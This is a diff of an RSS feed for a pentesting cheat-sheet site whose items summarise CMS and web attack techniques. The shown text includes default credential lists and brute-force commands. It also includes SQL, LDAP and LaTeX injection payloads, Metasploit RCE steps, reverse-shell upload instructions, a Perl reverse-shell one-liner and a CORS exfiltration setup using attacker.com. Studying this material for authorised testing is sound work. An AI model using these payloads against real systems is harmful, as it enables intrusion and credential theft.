@@ -23,6 +23,13 @@
       <description>Default Credentials link admin:elasticadmin elastic:changeme Brute Force Credentials linkCrack the &amp;ldquo;Authorization&amp;rdquo; header in the web page.&#xA;hydra -L usernames.txt -P passwords.txt &amp;lt;target-ip&amp;gt; -s 9200 http-get / Common Directories link /_cat/ /_cat/indices /_cluster/ /_nodes/ /_remote/ /_security /_search?q=username /_search?q=password /_security/role /_security/user /_xpack/security/user/ </description>
     </item>
     <item>
+      <title>Joomla CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/joomla-cms-pentesting/</link>
+      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/joomla-cms-pentesting/</guid>
+      <description>Scan link joomscan -u https://example.com Common Directories link /administrator/ /administrator/manifests/files/joomla.xml /cache/ /components/ /configuration.php /htaccess.txt /includes/ /index.php /joomla.xml /language/en-GB/en-GB.xml /libraries/ /LICENSE.txt /logs/ /media/ /modules/ /plugins/ /README.txt /templates/ /tmp/ Default Credentials linkThe default username is &amp;ldquo;admin&amp;rdquo; and no password.</description>
+    </item>
+    <item>
       <title>Web Content Discovery</title>
       <link>https://documentnation.github.io/docs/hdks/web/method/web-content-discovery/</link>
       <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
@@ -42,6 +49,13 @@
       <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/web/method/web-login-bypass/</guid>
       <description>Common Default Credentials linkCheck if the website has not changed credential from the default username/password.&#xA;admin:admin admin:password admin:password1 admin:password123 admin:passw0rd admin:(empty) admin:12345 administrator:password administrator:password1 administrator:password123 administrator:passw0rd administrator:(empty) administrator:12345 # phpIPAM admin:ipamadmin Admin:ipamadmin # PHPMyAdmin root:(null) root:password SQL Injections link &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1 &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1-- or true-- &amp;#39; or true-- UNION SELECT null-- &amp;#39; UNION SELECT null-- &amp;#39; UNION SELECT 1,2-- Microsoft, Oracle, PostgreSQL link &amp;#39;-- &amp;#39; or 1=1-- &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- }&amp;#34; or 1=1-- MySQL link &amp;#39;-- - &amp;#39;# &amp;#39; or 1=1# &amp;#39; or 1=1-- - &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- - &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;# }&amp;#34; or 1=1-- - NoSQL Injection linkReference: https://portswigger.</description>
+    </item>
+    <item>
+      <title>WordPress Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/wordpress-pentesting/</link>
+      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/wordpress-pentesting/</guid>
+      <description>Enumeration link nmap --script http-wordpress-brute nmap --script http-wordpress-enum --script-args type=&amp;#34;plugins&amp;#34;,search-limit=1500 -p 80 &amp;lt;target-ip&amp;gt; nmap --script http-wordpress-users -p 80 &amp;lt;target-ip&amp;gt; nmap --script http-wordpress-* -p 80 &amp;lt;target-ip&amp;gt; WpScan linkWpscan is a WordPress security scanner which can brute force credentials.&#xA;wpscan --url http://&amp;lt;target-ip&amp;gt; -P wordlist.txt # --rua: random user agent # --http-auth username:password # -e: enumerate # ap: All plugins # at: All themes # tt: Timthumbs # cb: Config backups # dbe: Db exports # u: User IDs range # m: Media IDs range wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://vulnerable.</description>
     </item>
     <item>
       <title>Burp Suite Troubleshooting</title>
@@ -156,13 +170,6 @@
       <description>Checklist link The admin page allows non-admin users to access. Directory listing is enabled. Test environment is public. Default username and password. Admin’s password is easy to guess e.g. &amp;ldquo;admin&amp;rdquo;, &amp;ldquo;password123&amp;rdquo;, etc. The software is out of date or vulnerable version. Attacker-friendly error messages are displayed e.g. it reveals the software version. A cloud service provider (CSP) has default sharing permissions. Unsecure http protocol is used rather than https. Check CSP (Content-Security-Policy) linkWe can check if the CSP is vulnerable or not using online tools as below.</description>
     </item>
     <item>
-      <title>API Pentesting</title>
-      <link>https://documentnation.github.io/docs/hdks/web/api/</link>
-      <pubDate>Wed, 11 Oct 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/web/api/</guid>
-      <description>API Subdomains Discovery linkReference: https://infosecwriteups.com/how-to-discover-api-subdomains-api-hacking-41ef91d00846&#xA;api.example.com # with another subdomain sub.api.example.com api.sub.example.com # Versions v1.api.example.com v2.api.example.com api.v1.example.com api.v2.example.com Google Dorks link site:*.api.example.com site:api.*.example.com # Random domains site:*.api.*.* site:api.*.*.* site:*.api.*.com site:api.*.*.com site:*.api.*.gov site:api.*.*.gov Automation link subfinder -d example.com | grep api Below fuzz target web server directly so be careful when doing that.&#xA;ffuf -u https://FUZZ.api.example.com -w wordlist.txt ffuf -u https://api/FUZZ.example.com -w wordlist.txt Change Methods link # Methods GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH, INVENTED Endpoint Discovery linkTry to enumerate endpoints while changing HTTP methods like GET, POST, OPTIONS, etc.</description>
-    </item>
-    <item>
       <title>NoSQL Injection</title>
       <link>https://documentnation.github.io/docs/hdks/web/security-risk/nosql-injection/</link>
       <pubDate>Thu, 05 Oct 2023 00:00:00 +0000</pubDate>
@@ -196,6 +203,13 @@
       <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/web/framework/python/flask-jinja2-pentesting/</guid>
       <description>Common Directories link /app.py /main.py /modules.py /modules/__init__.py /modules/admin.py SSTI (Server-Side Template Injection) linkSometimes, website may filter specific characters.&#xA;If so, URL encode the payload or convert to HEX.&#xA;In addition, it’s recommended to send requests using Burp Suite because web browsers automatically update the payload.&#xA;First, try below payloads.&#xA;{{ 4*2 }} {{ config.items() }} # Remove curly brackets {2*3} 2*3 RCE linkIf success, we may be able to exploit with OS command injection.</description>
+    </item>
+    <item>
+      <title>LDAP Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-injection/</link>
+      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-injection/</guid>
+      <description>Basic Payloads link (&amp;amp;uid=*)(userPassword=*) (&amp;amp;uid=*)|(userPassword=*) (&amp;amp;uid=*)|(objectClass=*)(userPassword=password123) *)(uid=*))(|(password=*) </description>
     </item>
     <item>
       <title>SQL Injection with Sqlmap</title>
@@ -413,6 +427,13 @@
       <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/web/security-risk/latex-injection/</guid>
       <description>Payloads - Read Files link # Read file \input{/etc/passwd} $\input{/etc/passwd}$ $$\input{/etc/passwd}$$ \include{example} # Read example.tex $\include{example}$ $$\include{example}$$ \lstinputlisting{/etc/passwd} $\lstinputlisting{/etc/passwd}$ $$\lstinputlisting{/etc/passwd}$$ Payloads - Write File link \newwrite\outfile $\newwrite\outfile$ $$\newwrite\outfile$$ \openout\outfile=cmd.tex $\openout\outfile=cmd.tex$ $$\openout\outfile=cmd.tex$$ \write\outfile{Hello-World} $\write\outfile{Hello-World}$ $$\write\outfile{Hello-World}$$ </description>
+    </item>
+    <item>
+      <title>GraphQL Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/api/graphql-pentesting/</link>
+      <pubDate>Sat, 17 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/api/graphql-pentesting/</guid>
+      <description>Common Directories link /graphql /graphiql /graphql.php /graphql/console Basic Operations - Queries linkWe can fetch field information by sending queries.&#xA;query { __typename } Fields linkTo fetch a field object, send a query like the following.&#xA;query { user { name friends { name } } } Arguments linkWe can get the specific information by padding arguments (e.g. id) to fields.&#xA;query { user (id: &amp;#34;1&amp;#34;) { name } } Aliases linkWe can set aliases each field to get multiple results in one request.</description>
     </item>
     <item>
       <title>DOM Cloberring</title>
@@ -667,6 +688,13 @@
       <description>Bypass linkWe may be able to bypass the rate limiting by adding one of the following headers and change the IP per request.&#xA;Sometimes, we need to add multiple headers.&#xA;X-Forwarded: &amp;lt;IP&amp;gt; X-Forwarded-For: &amp;lt;IP&amp;gt; X-Forwarded-Host: &amp;lt;IP&amp;gt; X-Client-IP: &amp;lt;IP&amp;gt; X-Remote-IP: &amp;lt;IP&amp;gt; X-Remote-Addr: &amp;lt;IP&amp;gt; X-Host: &amp;lt;IP&amp;gt; X-Originating-IP: &amp;lt;IP&amp;gt; </description>
     </item>
     <item>
+      <title>Mara CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/mara-cms-pentesting/</link>
+      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/mara-cms-pentesting/</guid>
+      <description>Default Credentials link admin:changeme Remote Code Execution (RCE) v7.5 linkReference: https://www.exploit-db.com/exploits/48780&#xA;Automation link msfconsole msf&amp;gt; use exploit/multi/http/maracms_upload_exec msf&amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf&amp;gt; set lhost &amp;lt;local-ip&amp;gt; msf&amp;gt; set srvhost &amp;lt;local-ip&amp;gt; msf&amp;gt; set srvport &amp;lt;local-port&amp;gt; msf&amp;gt; set targeturi /path/to/maracms/ msf&amp;gt; set targeturipath /path/to/maracms/ </description>
+    </item>
+    <item>
       <title>Codiad Pentesting</title>
       <link>https://documentnation.github.io/docs/hdks/web/codiad-pentesting/</link>
       <pubDate>Sun, 26 Feb 2023 00:00:00 +0000</pubDate>
@@ -688,11 +716,18 @@
       <description>Communication linkWe can communicate with memcache server using Netcat.&#xA;nc -vn &amp;lt;ip&amp;gt; 11211 Connection to &amp;lt;ip&amp;gt; 11211 port [tcp/*] succeeded! # Commands in nc version stats stats slabs stats items stats cachedump &amp;lt;number&amp;gt; 0 stats cachedump 1 0 get &amp;lt;item_name&amp;gt; </description>
     </item>
     <item>
-      <title>CMS (Content Management System) Pentesting</title>
-      <link>https://documentnation.github.io/docs/hdks/web/cms/</link>
+      <title>FUEL CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/fuel-cms-pentesting/</link>
       <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/web/cms/</guid>
-      <description>CMS Detection linkIf you don&amp;rsquo;t know which CMS used in target websites, you can detect it using Cmseek which is an automatic CMS detection tool.&#xA;cmseek -u vulnerable.com </description>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/fuel-cms-pentesting/</guid>
+      <description>Default Credential link admin:admin </description>
+    </item>
+    <item>
+      <title>Subrion CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/subrion-cms-pentesting/</link>
+      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/subrion-cms-pentesting/</guid>
+      <description>File Upload to Reverse Shell (Credential Required) link1. Download Reverse Shell Payload linkGet the PHP payload from php-reverse-shell. And change the file extension to &amp;rsquo;.phar&amp;rsquo;.&#xA;Then start a listener.&#xA;nc -lvnp 4444 2. Upload the Payload in Subrion Panel link Login&#xA;Move to Content -&amp;gt; Uploads in Panel&#xA;Upload reverse-shell.phar&#xA;Access to /subrion/upload/reverse-shell.phar&#xA;Now you get a shell.</description>
     </item>
     <item>
       <title>ClipBucket Pentesting</title>
@@ -728,6 +763,20 @@
       <pubDate>Thu, 09 Feb 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/web/security-risk/cors-attack/</guid>
       <description>Origin Reflection link1. Change Origin Value of Request Header link Origin: https://attacker.com Origin: https://vulnerable.com.attacker.com 2. Check if the Response Allowing Cross-Origin linkIt&amp;rsquo;s reflected the previous reqeust in the response header, you can exploit it.&#xA;Access-Control-Allow-Origin: https://attacker.com Access-Control-Allow-Origin: https://vulnerable.com.attacker.com Access-Control-Allow-Credentials: true 3. Exploit with Your Malicious Web Page linkFor example, it&amp;rsquo;s hosted as &amp;ldquo;https://attacker.com/exploit&#34; or &amp;ldquo;https://vulnerable.com.attacker.com/exploit&#34;.&#xA;Add the JavaScript code in the web page.&#xA;It shows the users&amp;rsquo; sensitive information of the target website in your server&amp;rsquo;s log.</description>
+    </item>
+    <item>
+      <title>Cockpit CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/cockpit-cms-pentesting/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/cockpit-cms-pentesting/</guid>
+      <description>Enumeration &amp;amp; Remote Code Execution (RCE) &amp;amp; Reverse Shell link # Reset password (CVE-2020-35847) msf&amp;gt; use exploit/multi/cockpit_cms_rce msf&amp;gt; set USER admin msf&amp;gt; run Version Detection linkCockpit CMS version is displayed as the value of “data-version” attribute in html tag.&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34; data-base=&amp;#34;/&amp;#34; data-route=&amp;#34;/&amp;#34; data-version=&amp;#34;0.11.1&amp;#34; data-locale=&amp;#34;en&amp;#34;&amp;gt; Common Directories link /auth/check # We can enumerate users using the path /auth/forgotpassword /auth/index /auth/login /auth/requestreset # We can enumerate users using the path </description>
+    </item>
+    <item>
+      <title>Concrete CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/concrete-cms-pentesting/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/concrete-cms-pentesting/</guid>
+      <description>Default Credentials linkThe default username is “admin” in Concrete5.</description>
     </item>
     <item>
       <title>Browser in the Browser (BITB) Attack</title>
@@ -856,6 +905,13 @@
       <description>Server-Side Template Injection (SSTI) link #{2*2} #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(&amp;#34;child_process&amp;#34;).exec(&amp;#39;id&amp;#39;)}()} Reverse Shell linkFirst off, create a payload.&#xA;use Socket;$i=&amp;#34;&amp;lt;local-ip&amp;gt;&amp;#34;;$p=&amp;lt;local-port&amp;gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);}; Encode it with Base64.&#xA;And start listener for getting the incoming connection.&#xA;nc -lvnp 4444 Then prepare the full payload contained the above Base64 encoded hash.&#xA;h1= Hello world p 3*3 is #{3*3} #{spawn_sync = this.process.binding(&amp;#39;spawn_sync&amp;#39;)} #{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;amp;&amp;amp;(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(&amp;#39; &amp;#39;);typeof a.shell===&amp;#39;string&amp;#39;?c=a.shell:c=&amp;#39;/bin/sh&amp;#39;,b=[&amp;#39;-c&amp;#39;,g];}typeof a.argv0===&amp;#39;string&amp;#39;?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f&amp;#43;&amp;#39;=&amp;#39;&amp;#43;d[f]);return{file:c,args:b,options:a,envPairs:e};}} #{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.</description>
     </item>
     <item>
+      <title>TYPO3 Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/typo3-pentesting/</link>
+      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/typo3-pentesting/</guid>
+      <description>Directory Discovery link /fileadmin/ /typo3/ /typo3conf/ /typo3temp/ Default Credentials link admin:&amp;lt;password-specified-when-installed&amp;gt; Reverse Shell (Admin Credential Required) linkFirst, to check and edit the configuration of the uploaded file extension, go to “ADMIN TOOLS” → “Configure Installation-Wide Options” → “Backend” → “fileDenyPattern”.&#xA;Update the configuration if necessary. For example, remove “php[1-9]?”&#xA;\.(phpsh|phtml|pht|phar|shtml|cgi)(\..*)?$|\.pl$|^\.htaccess$ Next, prepare the payload for reverse shell named “shell.php”.&#xA;wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php Go to “FILE” → “Filelist” and upload the payload to the root of /fileadmin.</description>
+    </item>
+    <item>
       <title>Webmin Pentesting</title>
       <link>https://documentnation.github.io/docs/hdks/web/webmin-pentesting/</link>
       <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
@@ -889,6 +945,13 @@
       <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/web/cloud/aws-pentesting/</guid>
       <description>Amazon Resource Names (ARNs) link # Format arn:aws:&amp;lt;service&amp;gt;:&amp;lt;region&amp;gt;:&amp;lt;account_id&amp;gt;:&amp;lt;resource_type&amp;gt;/&amp;lt;resource_name&amp;gt; Identify and Access Management (IAM) link # Add credentials # This will add entries to .aws/config or .aws/credentials in user&amp;#39;s home directory. # &amp;lt;profile-name&amp;gt; is arbitrary. aws configure --profile &amp;lt;profile-name&amp;gt; # List credentials aws configure list --profile &amp;lt;profile-name&amp;gt; # Find the account id belonging to an access key (access key starts with &amp;#34;AKIA&amp;#34;) aws sts get-access-key-info --access-key-id AKIAQ31B... # Determin the username the access key you&amp;#39;re using belogns to aws sts get-caller-identity --profile &amp;lt;profile-name&amp;gt; # List all EC2 instances running in an account aws ec2 describe-instances --output text --profile &amp;lt;profile-name&amp;gt; # List all EC2 instances running in an account in a dirrerent region aws ec2 describe-instances --output text --region us-east-1 --profile &amp;lt;profile-name&amp;gt; Amazon S3 linkA public cloud storage resource available in Amazon Web Services (AWS) Simple Storage Service (S3), an object storage offering.</description>
+    </item>
+    <item>
+      <title>Bolt CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/bolt-cms-pentesting/</link>
+      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/bolt-cms-pentesting/</guid>
+      <description>Login Page link /bolt Remote Code Execution (v3.7.1) link msfconsole msf&amp;gt; use exploit/unix/webapp/bolt_authenticated_rce msf&amp;gt; set lhost &amp;lt;local-ip&amp;gt; msf&amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf&amp;gt; set username &amp;lt;username&amp;gt; msf&amp;gt; set password &amp;lt;password&amp;gt; msf&amp;gt; run </description>
     </item>
     <item>
       <title>Code Deobfuscation</title>
